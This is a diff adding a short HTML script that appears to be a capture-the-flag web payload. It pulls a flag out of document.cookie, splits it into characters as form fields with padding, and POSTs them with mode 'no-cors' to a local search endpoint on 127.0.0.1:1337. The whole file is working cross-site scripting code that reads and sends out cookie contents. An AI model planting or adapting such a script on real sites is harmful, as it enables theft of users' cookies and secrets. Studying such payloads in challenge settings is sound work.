@@ -1,0 +1,24 @@
+<script>
+    let pad=10;
+    let flag=document.cookie.split('{')[1].split('}')[0];
+    let url="http://127.0.0.1:1337/search"
+    let dict='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+    let body="";
+    for(let i=0;i<flag.length;i+=1){
+        body+=dict[i]+'='+flag[i]+'&';
+    }
+    for(let i=0;i<pad;i+=1){
+        body+=dict[flag.length+i]+'=a&';
+    }
+
+    fetch(url, {
+        method: 'POST',
+        mode: 'no-cors',
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded',
+        },
+        body: body
+    })
+
+
+</script>
